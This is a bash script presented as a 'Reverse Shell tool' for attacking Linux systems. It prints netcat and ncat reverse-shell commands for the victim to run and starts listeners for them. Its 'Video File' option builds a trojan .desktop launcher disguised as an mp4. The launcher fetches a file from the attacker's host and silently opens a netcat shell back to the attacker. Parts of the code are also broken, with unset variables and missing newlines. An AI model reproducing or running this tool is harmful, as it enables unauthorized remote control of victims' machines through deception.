#!/bin/bash
#coded by Fadester
#v1.0

clear

#colors

green='\033[1;32m'
red='\e[1;91m'
yellow='\e[0m\e[1;93m'
lightgreen='\e[1;32m'
farblos='\e[0m'
BlueF='\e[1;34m'
cyan='\e[0;36m'
lightred='\e[101m'
blink='\e[5m'
magenta='\e[35m'
white='\e[1;37m'

dir=$(pwd)

#checking Dependencies
echo -e "$BlueF[$yellow*$BlueF]$yellow Checking Dependencies... $farblos"
sleep 0.5
echo
user=$USER
printf "\e[1;34m[\e[0m\e[1;93m*\e[1;34m]\e[0m\e[1;93m User:$farblos"
if [[ $user == "root" ]]; then
  sleep 0.3
  echo -e "$green root $farblos"
  sleep 0.3
else
  echo -e "$red $user $farblos"
  echo -e "$BlueF[$red!$BlueF]$red You need to be root to run this script $farblos"
  exit 1
fi
sleep 0.2
printf "\e[1;34m[\e[0m\e[1;93m*\e[1;34m]\e[0m\e[1;93m Netcat$farblos"
command -v nc > /dev/null 2>&1
if [[ $? == 0 ]]; then
  sleep 0.3
  echo -e "$green OK! $farblos"
  sleep 0.3
else
  echo -e "$red FAIL! $farblos"
  sleep 0.3
  echo -e "$red You need Netcat to use this script! $farblos"
  exit 1
fi
sleep 0.2
printf "\e[1;34m[\e[0m\e[1;93m*\e[1;34m]\e[0m\e[1;93m Ncat$farblos"
command -v ncat > /dev/null 2>&1
if [[ $? == 0 ]]; then
  sleep 0.3
  echo -e "$green OK! $farblos"
  sleep 0.3
else
  echo -e "$red FAIL! $farblos"
  sleep 0.3
  echo -e "$red You need Ncat to use this script! $farblos"
  exit 1
fi

banner() {
clear
echo
echo -e "$red ▪      .▄▄ · ▄▄▄ .▄▄▄ .     ▄· ▄▌      ▄• ▄▌  $farblos "
echo -e "$red ██     ▐█ ▀. ▀▄.▀·▀▄.▀·    ▐█▪██▌▪     █▪██▌  $farblos "
echo -e "$red ▐█·    ▄▀▀▀█▄▐▀▀▪▄▐▀▀▪▄    ▐█▌▐█▪ ▄█▀▄ █▌▐█▌  $farblos "
echo -e "$red ▐█▌    ▐█▄▪▐█▐█▄▄▌▐█▄▄▌     ▐█▀·.▐█▌.▐▌▐█▄█▌  $farblos "
echo -e "$red ▀▀▀     ▀▀▀▀  ▀▀▀  ▀▀▀       ▀ •  ▀█▄▀▪ ▀▀▀   $farblos "
echo
printf "\033[1;32m         _______________          \e[35m|*\_/*|\033[1;32m________   \n"
printf "\033[1;32m        |  ___________  |        |\e[35m|_/-\_|\033[1;32m______  |  \n"
printf "\033[1;32m        | |           | |        | |           | |  \n"
printf "\033[1;32m        | |   0   0   | |        | |   0   0   | |  \n"
printf "\033[1;32m        | |     -     | |        | |     -     | |  \n"
printf "\033[1;32m        | |   \___/   | |        | |   \___/   | |  \n"
printf "\033[1;32m        | |___     ___| |        | |___________| |  \n"
printf "\033[1;32m        |_____|\e[1;34m\_/\033[1;32m|_____|        |_______________|  \n"
printf "\033[1;32m          _|__|\e[1;34m/ \ \033[1;32m|_|_............._|________|_    \n"
printf "\033[1;32m         / ********** \            / ********** \   \n"
printf "\033[1;32m       /  ************  \        /  ************  \   \n"
printf "\033[1;32m      --------------------      --------------------  \n"
echo
echo -e "      $BlueF[$red::$BlueF]    $yellow++$green--$BlueF[$red Reverse Shell tool $BlueF]$green--$yellow++    $BlueF[$red::$BlueF]$farblos"
echo -e "      $BlueF[$red::$BlueF]    $yellow++$green--$BlueF[$red coded by Fadester  $BlueF]$green--$yellow++    $BlueF[$red::$BlueF]$farblos"
echo -e "      $BlueF[$red::$BlueF]    $yellow++$green--$BlueF[$red        v1.0        $BlueF]$green--$yellow++    $BlueF[$red::$BlueF]$farblos"
}
eingabe() {
echo
echo -e "$BlueF[$green""1$BlueF]$yellow Linux $farblos"
echo
read -p $'\e[1;34m[\e[35mChoice\e[1;34m]\e[1;34m >> \e[1;37m' eingabe
if [[ $eingabe == 1 ]]; then
  shell_linux
else
  echo -e "$BlueF[$red!$BlueF]$red Invalid option! $farblos"
fi

}
#choose linux attack method
shell_linux() {
echo
echo -e "$BlueF[$green""1$BlueF]$yellow Netcat $farblos"
echo -e "$BlueF[$green""2$BlueF]$yellow Ncat $farblos"
echo
read -p $'\e[1;34m[\e[35mChoice\e[1;34m]\e[1;34m >> \e[1;37m' eingabe1
if [[ $eingabe1 == "1" ]]; then
  echo
  echo -e "$BlueF[$red!$BlueF]$green LOCAL $farblos"
  echo -e "$BlueF[$green""1$BlueF]$yellow Video File $farblos"
  echo -e "$BlueF[$green""2$BlueF]$yellow Execute code manually [Decrypted] $farblos"
  echo -e "$BlueF[$green""3$BlueF]$yellow Execute code manually $farblos"
  echo
  read -p $'\e[1;34m[\e[35mChoice\e[1;34m]\e[1;34m >> \e[1;37m' eingabe2
  if [[ $eingabe2 == 1 ]]; then
    shell_linux_vid
  elif [[ $eingabe2 == 2 ]]; then
    shell_manually_dec
  elif [[ $eingabe2 == 3 ]]; then
    shell_manually

  fi
elif [[ $eingabe1 == 2 ]]; then
  shell_ncat
else
  echo -e "$BlueF[$red!$BlueF]$red Invalid option! $farblos"
fi

}
shell_manually() {
echo
echo -e "$BlueF[$yellow*$BlueF]$green Attacking System:$magenta Linux $farblos"
read -p $'\e[1;34m[\033[1;32m+\e[1;34m]\033]\033[1;32m Target IP address:\e[1;37m ' target_ip
echo -e "$BlueF[$red!$BlueF]$yellow Execute code: nc -l -p 6996 -e /bin/bash $farblos"
sleep 0.5
echo -e "$BlueF[$green*$BlueF]$green Starting listener... $farblos"
sleep 0.5
while [[ true ]]; do
  nc -v $target_ip 6996
  sleep 1
done

}
shell_manually_dec() {
echo
echo -e "$BlueF[$yellow*$BlueF]$green Attacking System:$magenta Linux $farblos"
read -p $'\e[1;34m[\033[1;32m+\e[1;34m]\033]\033[1;32m Target IP address:\e[1;37m ' target_ip
read -p $'\e[1;34m[\033[1;32m+\e[1;34m]\033]\033[1;32m Your IP address:\e[1;37m ' my_ip

echo -e "$BlueF[$red!$BlueF]$yellow Execute code: nc -e /bin/sh $my_ip 8080 $farblos"
sleep 0.5
echo -e "$BlueF[$green*$BlueF]$green Starting listener... $farblos"
xterm -e python3 -m http.server 80 &
sleep 0.5
while [[ true ]]; do
  nc -lvp 8080
done

}

shell_linux_vid() {
echo
echo -e "$BlueF[$yellow*$BlueF]$green Attacking System:$magenta Linux $farblos"
default_ip=$(ip a | grep 192.168. | cut -d "/" -f1 | cut -d " " -f6)
printf "\e[1;34m[\033[1;32m+\e[1;34m]\033]\033[1;32m Target IP address (default: $default_ip):\e[1;37m "
read ip_address
if [[ $ip_address == "" ]]; then
  ip_address=$default_ip
  echo -e "$BlueF[$green+$BlueF]$green Your IP = $ip_address $farblos"
fi

read -p $'\e[1;34m[\033[1;32m+\e[1;34m]\033]\033[1;32m Video file [mp4]:\e[1;37m ' vid
cp $vid $dir > /dev/null 2>&1

printf "[Desktop Entry]" >> funny_video.desktop
printf "Encoding=UTF-8" >> funny_video.desktop
printf "Name=fake_video.mp4" >> funny_video.desktop
printf "Exec=/usr/bin/wget 'http://$my_ip/$vid' -O /tmp/$vid; /usr/bin/xdg-open /tmp/$vid; /usr/bin/mkfifo /tmp/f; nc -e /bin/bash $my_ip < /tmp/f | /bin/bash -i > /tmp/f 2>&1 &" >> funny_video.desktop
printf "Terminal=false" >> funny_video.desktop
printf "Type=Application" >> funny_video.desktop
printf "Icon=video-x-generic" >> funny_video.desktop
sleep 0.5
echo -e "$BlueF[$green*$BlueF]$green Starting listener... $farblos"
xterm -e python3 -m http.server 80 &
while [[ true ]]; do
  nc -v $target_ip 12345
  sleep 1.5
done

}
shell_ncat() {
echo
echo -e "$BlueF[$yellow*$BlueF]$green Attacking System:$magenta Linux $farblos"
read -p $'\e[1;34m[\033[1;32m+\e[1;34m]\033]\033[1;32m Target IP address:\e[1;37m ' target_ip
read -p $'\e[1;34m[\033[1;32m+\e[1;34m]\033]\033[1;32m Your IP address:\e[1;37m ' my_ip
echo -e "$BlueF[$red!$BlueF]$yellow Execute code: ncat --ssl $my_ip 8080 -c bash $farblos"
sleep 0.5
echo -e "$BlueF[$green*$BlueF]$green Starting listener... $farblos"

ncat -v --ssl -l 8080
}


banner
eingabe
